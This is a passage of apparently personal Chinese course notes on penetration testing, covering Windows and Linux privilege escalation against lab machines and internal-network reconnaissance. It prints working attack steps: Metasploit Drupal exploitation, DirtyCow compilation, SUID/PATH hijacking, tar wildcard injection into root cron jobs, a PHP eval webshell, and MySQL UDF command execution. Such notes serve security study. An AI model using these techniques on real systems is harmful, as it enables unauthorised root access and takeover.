</span><br><span class="line">系统权限</span><br><span class="line">域控权限</span><br></pre></td></tr></table></figure>

<h3 id="day59-权限提升-Win溢出漏洞及AT-amp-SC-amp-PS提权"><a href="#day59-权限提升-Win溢出漏洞及AT-amp-SC-amp-PS提权" class="headerlink" title="day59-权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权"></a>day59-权限提升-Win溢出漏洞及AT&amp;SC&amp;PS提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 溢出漏洞原理</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">服务器</span><br><span class="line">	针对环境</span><br><span class="line">		web 本地</span><br><span class="line">	提权方法</span><br><span class="line">		数据库* 溢出漏洞* 令牌窃取 第三方软件 AT&amp;SC&amp;PS 不安全的服务权限 不带引号的服务路径 Unattended_Installs AlwaysInstallElevated</span><br><span class="line">	针对版本</span><br><span class="line">		windows_xp win7/8/10(个人) win2k3/08 win2012/16</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1668764215649.png" alt="1668764215649"></p>
<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1668764506649.png" alt="1668764506649"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv		查看当前账户具体权限</span><br><span class="line">systeminfo			查看系统信息 此处可以看到打过哪些补丁KB打头</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	at	win2003	定时任务会以system权限执行</span></span><br><span class="line">at 11.20 /interactive cmd.exe</span><br><span class="line"><span class="comment">#	sc	启动服务被使用system权限</span></span><br><span class="line">sc Create syscmd binPath= <span class="string">&quot;cmd /K start&quot;</span> <span class="built_in">type</span>= own <span class="built_in">type</span>=interact</span><br><span class="line">sc start syscmd</span><br><span class="line"><span class="comment">#	ps	需要提前下载psexec.exe文件		微软官方提权工具</span></span><br><span class="line">psexec.exe -accepteula -s -i -d cmd.exe	</span><br></pre></td></tr></table></figure>

<h3 id="day60-权限提升-MY-amp-MS-amp-ORA等数据库提权"><a href="#day60-权限提升-MY-amp-MS-amp-ORA等数据库提权" class="headerlink" title="day60-权限提升-MY&amp;MS&amp;ORA等数据库提权"></a>day60-权限提升-MY&amp;MS&amp;ORA等数据库提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">探针</span><br><span class="line">	端口 服务 其他</span><br><span class="line">收集</span><br><span class="line">	最高权限密码</span><br><span class="line">		配置文件* 存储文件 暴力猜解 其他方式</span><br><span class="line">分类</span><br><span class="line">	Mysql</span><br><span class="line">		UDF* MOF 启动项 反弹shell</span><br><span class="line">	Mssql</span><br><span class="line">		xp_cmdshell sp_oacreate 沙盒模式 映像劫持</span><br><span class="line">	Oracle</span><br><span class="line">		普通用户 DBA用户 注入模式</span><br><span class="line">	Redis</span><br><span class="line">	Postgresql</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	mysql提权 脚本和msf</span></span><br><span class="line">上传的是大马	首先查看开启端口udf <span class="string">&quot;user defined function&quot;</span>	</span><br><span class="line">找存放账号密码的地方 直接代码审计搜root</span><br><span class="line"></span><br><span class="line">1. UDF提权知识点</span><br><span class="line">通过添加新函数对MYSQL功能进行扩充，性质就像本地MYSQL函数如abs() concat()</span><br><span class="line">	https://blog.csdn.net/qq_43430261/article/details/107258466</span><br><span class="line">读取网站数据库配置文件（了解命名规则及查找技巧）</span><br><span class="line">	sql data inc config conn database common include等</span><br><span class="line">读取数据库存储或备份文件</span><br><span class="line">	@@basedir/data/数据库名/表名.myd</span><br><span class="line">	mysql.user	存用户密码	Mysql/data/mysql/user.MYD</span><br><span class="line">利用脚本暴力采解(了解数据库是否支持外联及如何开启外联)</span><br><span class="line">	root一般不支持外联</span><br><span class="line">	上传爆破脚本去爆破</span><br><span class="line">远程暴力猜解卖服务器本地暴力猜解</span><br><span class="line">利用自定义执行函数导出dll文件进行命令执行</span><br><span class="line"></span><br><span class="line">2.	MOF</span><br><span class="line">3.	启动项</span><br><span class="line">	https://blog.csdn.net/qq_37077262/article/details/102964050</span><br><span class="line">	msf启动项提权，需要开启数据库外联 windows/mysql/mysql_start_up</span><br><span class="line">开启外联</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="string">&#x27;root&#x27;</span> WITH GRANT OPTION;</span><br><span class="line">GRANT ALL PRIVILEGES ON * TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="string">&#x27;root&#x27;</span> WITH GRANT OPTION;</span><br><span class="line">kali 连接要带上-proot</span><br><span class="line">	mysql -h 102.168.188.1 -uroot -proot</span><br><span class="line"></span><br><span class="line">windows/mysql/mysql_start_up</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlserver只在windows上有</span><br><span class="line">看到<span class="number">55</span>分钟 后面不是mysql的数据库</span><br></pre></td></tr></table></figure>

<h3 id="day61-权限提升-Redis-amp-Postgre-amp-令牌窃取-amp-进程注入"><a href="#day61-权限提升-Redis-amp-Postgre-amp-令牌窃取-amp-进程注入" class="headerlink" title="day61-权限提升-Redis&amp;Postgre&amp;令牌窃取&amp;进程注入"></a>day61-权限提升-Redis&amp;Postgre&amp;令牌窃取&amp;进程注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从25分钟开始</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 	令牌窃取</span><br></pre></td></tr></table></figure>

<h3 id="day62-权限提升-烂土豆-amp-dll劫持-amp-引号路径-amp-服务权限"><a href="#day62-权限提升-烂土豆-amp-dll劫持-amp-引号路径-amp-服务权限" class="headerlink" title="day62-权限提升-烂土豆&amp;dll劫持&amp;引号路径&amp;服务权限"></a>day62-权限提升-烂土豆&amp;dll劫持&amp;引号路径&amp;服务权限</h3><h3 id="day63-权限提升-Linux脏牛内核漏洞-amp-SUID-amp-信息收集"><a href="#day63-权限提升-Linux脏牛内核漏洞-amp-SUID-amp-信息收集" class="headerlink" title="day63-权限提升-Linux脏牛内核漏洞&amp;SUID&amp;信息收集"></a>day63-权限提升-Linux脏牛内核漏洞&amp;SUID&amp;信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Linux</span><br><span class="line">	针对环境</span><br><span class="line">		web 本地(ssh)</span><br><span class="line">	信息收集</span><br><span class="line">		内核信息 用户群组 环境信息 进程服务 计划任务 有无ssh_私钥 有无明文密码 可读写执行目录</span><br><span class="line">	提权服务</span><br><span class="line">		SUID 内核漏洞 环境变量 计划任务 第三方服务</span><br><span class="line">https://blog.csdn.net/qq_44159028/article/details/123684723</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#	案例1 linux提权自动化脚本利用-4个脚本</span><br><span class="line">两个信息收集 LinEnum(里面的LinEnum.sh文件上传到靶机使用sh运行),linuxprivchecker</span><br><span class="line">两个漏洞探针 linux-exploit-suggester linux-exploit-suggester2</span><br><span class="line">上传linEnum.sh之/tmp 服务器重启自动删除的文件夹</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#	suid	web</span><br><span class="line">	https://pentestlab.blog/2017/09/25/suid-executables/</span><br><span class="line">	https://blog.csdn.net/weixin_44770698/article/details/125941759</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#	墨者靶场 Ubuntu16.04漏洞复现 CVE-2017-16995	本地(ssh进去的)</span><br><span class="line">先用提供的ssh登录进去上传linux-exploit-suggester2.pl</span><br><span class="line">	perl linux-exploit-suggester2.pl</span><br><span class="line">内核提权 红队笔记碰到过 45010.c</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#	Linux提权脏牛内核漏洞演示	vulnhub lampiao</span><br><span class="line">靶机192.168.213.149</span><br><span class="line">扫端口 22 80 1898		1898使用drupal搭建</span><br><span class="line">kali</span><br><span class="line">	msfconsole</span><br><span class="line">		search drupal</span><br><span class="line">		use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">		show options</span><br><span class="line">		set RPORT 1898</span><br><span class="line">		set RHOST 192.168.213.149</span><br><span class="line">		exploit</span><br><span class="line">	meterpreter &gt; upload /home/hyy19/linux-exploit-suggester.sh /tmp/1.sh</span><br><span class="line">	shell</span><br><span class="line">		chmod +x /tmp/1.sh</span><br><span class="line">		/tmp/1.sh</span><br><span class="line">#	使用 CVE-2016-5195 dirtycow</span><br><span class="line">		python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">		cd /tmp</span><br><span class="line">		wget https://www.exploit-db.com/download/40611	没有直接用这个</span><br><span class="line">		没有直接用这个 用了</span><br><span class="line">			https://github.com/firefart/dirtycow</span><br><span class="line">		然后按照提示操作上传dirty.c然后靶机死机了?</span><br><span class="line">			靶机网页打不开了80 1898</span><br><span class="line">		Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</span><br><span class="line">		并不是内核的原因 应该是提权漏洞用错了</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1669255808666.png" alt="1669255808666"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#第二个解法msf攻击之后	/var/www/html</span><br><span class="line">cat /sites/default/settings.php</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1669254910242.png" alt="1669254910242"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#此处得到一个可能的密码 然后结合linux的/home用户进行ssh登录		-&gt;tiago</span><br><span class="line">这边就相当于本地提权了 如果用www-data用户要用python建立一个交互界面</span><br><span class="line">kali</span><br><span class="line">	searchsploit dirty</span><br><span class="line">	searchsploit -p 40847.cpp		#得到路径</span><br><span class="line">	cp /usr/share/exploitdb/exploits/linux/local/40847.cpp /home/hyy19</span><br><span class="line">meterpreter &gt; upload /home/hyy19/40847.cpp /tmp/1.cpp</span><br><span class="line">shell</span><br><span class="line">	python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">	ls /tmp -liah	#检查上传成功没</span><br><span class="line">	cd /tmp</span><br><span class="line">	g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 1.cpp -lutil</span><br><span class="line">	./dcow	#得到更新的root密码dirtyCowFun</span><br><span class="line">	su root</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux提权李木有pdf</span><br></pre></td></tr></table></figure>

<h3 id="day64-权限提升-Linux定时任务-amp-环境变量-amp-数据库"><a href="#day64-权限提升-Linux定时任务-amp-环境变量-amp-数据库" class="headerlink" title="day64-权限提升-Linux定时任务&amp;环境变量&amp;数据库"></a>day64-权限提升-Linux定时任务&amp;环境变量&amp;数据库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#本地环境变量安全-Aliyun</span><br><span class="line">https://www.cnblogs.com/tzf1/p/16207536.html</span><br><span class="line"># suid	普通用户使用某些文件命令时时赋予了文件的所有者的权限，而某些特定文件所有者是root</span><br><span class="line">https://www.cnblogs.com/tzf1/p/16207536.html</span><br><span class="line"></span><br><span class="line">配合SUID进行环境变量提权-本地用户环境</span><br><span class="line">gcc demo.c -o shell		#编译的shell上传到靶机</span><br><span class="line"></span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">	setuid(0);</span><br><span class="line">	setgid(0);</span><br><span class="line">	system(&quot;ps&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cp /bin/sh /tmp/ps</span><br><span class="line">ps		#使用环境变量中的ps</span><br><span class="line">./ps	#调用/bin/sh		#非管理员shell</span><br><span class="line"></span><br><span class="line">export PATH=/tmp:$PATH		#环境变量使用:分割</span><br><span class="line">ps		#此时调用/tmp下ps因为/tmp在最前面</span><br><span class="line">./shell		#管理员shell</span><br><span class="line"></span><br><span class="line">#感觉是这个上传的shell具有suid权限的原因</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1669370648475.png" alt="1669370648475"></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我的云服务器测试</span></span><br><span class="line">root执行</span><br><span class="line">demo.c</span><br><span class="line"><span class="comment">#include&lt;unistd.h&gt;</span></span><br><span class="line">void <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">	setuid(0);</span><br><span class="line">	setgid(0);</span><br><span class="line">	system(<span class="string">&quot;sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">gcc demo.c -o shell_sh</span><br><span class="line">复制到普通用户目录</span><br><span class="line"><span class="built_in">chmod</span> u+s shell_sh</span><br><span class="line">登录普通用户</span><br><span class="line">./shell_sh</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1669372162594.png" alt="1669372162594"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地用户才能使用sui提权，web用户不行，没有权限设置环境变量</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#本地定时任务安全-Aliyun</span></span><br><span class="line"><span class="comment">#第一种 计划任务指向的文件的相对路径解析问题 路径问题</span></span><br><span class="line"><span class="comment">#假设定时任务/usr/local/test.sh每分钟执行一次</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; /home/xiaodi/test.sh</span><br><span class="line"><span class="built_in">chmod</span> +x /home/xiaodi/test.sh</span><br><span class="line"><span class="comment">#让定时任务去执行/home/xiaodi/test.sh(此处没写)，然后具有root权限的定时任务会执行cp /bin/bash /tmp/bash; chmod +s /tmp/bash</span></span><br><span class="line"><span class="comment">#普通用户执行/tmp/bash即可获得管理员权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第二种 利用通配符配合命令参数自定义命令实现提权</span></span><br><span class="line"><span class="comment">#不安全定时任务备份命令</span></span><br><span class="line">定时任务 /etc/crontab中</span><br><span class="line">* * * * * root /home/undead/script/backup.sh</span><br><span class="line"><span class="comment">#backup.sh中 cd /home/undead/script; tar czf /tmp/backup.tar.gz *</span></span><br><span class="line"><span class="comment">#利用</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; /home/undead/script/test.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &quot;</span> &gt; <span class="string">&quot;--checkpoint-action=exec=sh test.sh&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot; &quot;</span> &gt; --checkpoint=1</span><br><span class="line">等待一分钟</span><br><span class="line">/tmp/bash -p	<span class="comment">#要加上-p加上之后返回shell为root权限</span></span><br><span class="line"><span class="comment">#	注意</span></span><br><span class="line">script文件的用undead用户创建，否则undead用户没有操作这个文件夹里面内容的权限</span><br><span class="line"><span class="built_in">chmod</span> u+x 文件;只给所有者执行权限 <span class="built_in">chmod</span> +x 文件;都给</span><br><span class="line">一行里面写两个命令用<span class="string">&#x27;;&#x27;</span>加<span class="string">&#x27; &#x27;</span>隔开</span><br><span class="line"></span><br><span class="line"><span class="comment">#第三种 利用不安全的权限分配操作导致的定时文件覆盖</span></span><br><span class="line"><span class="built_in">chmod</span> 777 wenjian;  <span class="built_in">chmod</span> 775 wenjian</span><br><span class="line">这个比较鸡肋</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#第三方服务数据库-Vulnhu 靶机Raven2</span><br><span class="line">192.168.213.150</span><br><span class="line">80端口目录扫描/vendor/PHPMailerAutoload.php有php mailer第三方插件</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1669387809102.png" alt="1669387809102"></p>
<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1669388458280.png" alt="1669388458280"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">payload看https://zhuanlan.zhihu.com/p/476568229</span><br><span class="line">	需要改目标地址 kali地址 靶机html目录 kali反弹shell</span><br><span class="line">访问http://192.168.213.150/hyy.php获得初级shell</span><br><span class="line"></span><br><span class="line">上传一句话木马</span><br><span class="line">echo &#x27;&lt;?php @eval($_POST[x])?&gt;&#x27; &gt; 1.php</span><br><span class="line">此处有个细节	通过echo单双引号看shell</span><br><span class="line">	https://www.jianshu.com/p/d7264f7564a3</span><br><span class="line">	单引号：所见即所得</span><br><span class="line">    双引号：所见非所得。会先把变量解析之后，再输出</span><br><span class="line">    反引号（``） ：命令替换，通常用于把命令输出结果传给入变量中</span><br><span class="line">    反斜杠( \ ) ：转义字符or逃脱字符，Linux如果echo要让转义字符发生作用，就要使用-e选项，且转义字符要使用双引号</span><br><span class="line"></span><br><span class="line">连接蚁剑上传扫描2件套 LinEnum suggest....</span><br><span class="line">数据mysql5.5.6</span><br><span class="line">/var/www/html/wordpress/wp-config.php</span><br><span class="line">获得数据库root密码	R@v3nSecurity</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1669392648998.png" alt="1669392648998"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#使用mysql udf提权</span><br><span class="line">从searchspoloit获取1518.c</span><br><span class="line">gcc -g -c 1518.c		#生成1518.o</span><br><span class="line">gcc -g -shard -o 1518.so 1518.o</span><br><span class="line">php -S 0:80</span><br><span class="line">靶机webshell</span><br><span class="line">	cd /tmp</span><br><span class="line">	wget https://xx.xx.xx.xx/1518.so</span><br><span class="line">蚁剑连接数据库</span><br><span class="line">	use mysql;</span><br><span class="line">	create table foo(line blob);</span><br><span class="line">	insert into foo values(load_file(&#x27;/tmp/1518.so&#x27;));</span><br><span class="line">	select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class="line">	#创建do_system函数调用</span><br><span class="line">	create function do_system returns integer soname &#x27;1518.so&#x27;;</span><br><span class="line">	select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">#靶机webshell</span><br><span class="line">	torch hyy</span><br><span class="line">	find hyy -exec &quot;whoami&quot; \;</span><br><span class="line">	find hyy -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1669460412434.png" alt="1669460412434"></p>
<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1669457522727.png" alt="1669457522727"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali的/bin都指向了/usr/bin</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#漏洞查找关注点-拓展总结</span><br><span class="line">	1.提权环境 信息收集(suid 定时任务可能漏洞 第三方服务应用)</span><br><span class="line">	2.最新相关漏洞要明确(关注点) 二次开发相关脚本学会展望(4个脚本)</span><br><span class="line">	3.本地searchsploit脚本及远程exploitdb站点搜索说明</span><br><span class="line">	4.其它提权方法 密码复用 guid sudo</span><br></pre></td></tr></table></figure>

<h3 id="day65-内网安全-域环境-amp-工组组-amp-局域网探针方案"><a href="#day65-内网安全-域环境-amp-工组组-amp-局域网探针方案" class="headerlink" title="day65-内网安全-域环境&amp;工组组&amp;局域网探针方案"></a>day65-内网安全-域环境&amp;工组组&amp;局域网探针方案</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">基本认识</span><br><span class="line">	名词</span><br><span class="line">		局域网 工作组 域环境 活动目录AD 域控制器DC</span><br><span class="line">	域</span><br><span class="line">		单域 父域和子域 域数和域森林</span><br><span class="line">	认知</span><br><span class="line">		Linux域渗透问题 局域网技术使用问题 大概内网安全流程问题</span><br><span class="line">信息收集</span><br><span class="line">	基本信息</span><br><span class="line">		版本 补丁 服务 任务 防护</span><br><span class="line">	网络信息</span><br><span class="line">		开放端口 网络环境 出口代理</span><br><span class="line">	用户信息</span><br><span class="line">		域用户 本地用户 用户权限 对应组信息</span><br><span class="line">	凭据信息</span><br><span class="line">		明文 hash 各种口令</span><br><span class="line">后续探针</span><br><span class="line">	存货主机 域控制器 网络架构 服务接口</span><br><span class="line">权限提升</span><br><span class="line">横向渗透</span><br><span class="line">权限维持</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1669458230824.png" alt="1669458230824"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">DMZ(demilitarized zone)两个防火墙之间的空间</span><br><span class="line">工作组 域(有管理者)</span><br><span class="line">	https://zhidao.baidu.com/question/492888380.html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 	基本信息收集 </span></span><br><span class="line"><span class="comment">#	旨在了解当前服务器接口信息 为判断当前角色功能网络加工后做准备</span></span><br><span class="line">systeminfo 			详细信息	操作系统版本 多少位 补丁信息</span><br><span class="line">net start			启动服务</span><br><span class="line">tasklist			进程列表</span><br><span class="line">schtasks			计划任务</span><br><span class="line"><span class="comment"># 	网络信息收集操作演示</span></span><br><span class="line"><span class="comment">#	了解当前服务器网络接口信息，判断当前角色，功能，网络架构做准备</span></span><br><span class="line">ipconfig /all		判断存在域-dns</span><br><span class="line">	主机名 主DNS后缀</span><br><span class="line">net view /domain	判断存在域</span><br><span class="line">net time /domain	判断主域</span><br><span class="line">netstat -ano		当前网络端口开放</span><br><span class="line">nslookup			域名 追踪来源地址</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1669459814523.png" alt="1669459814523"></p>
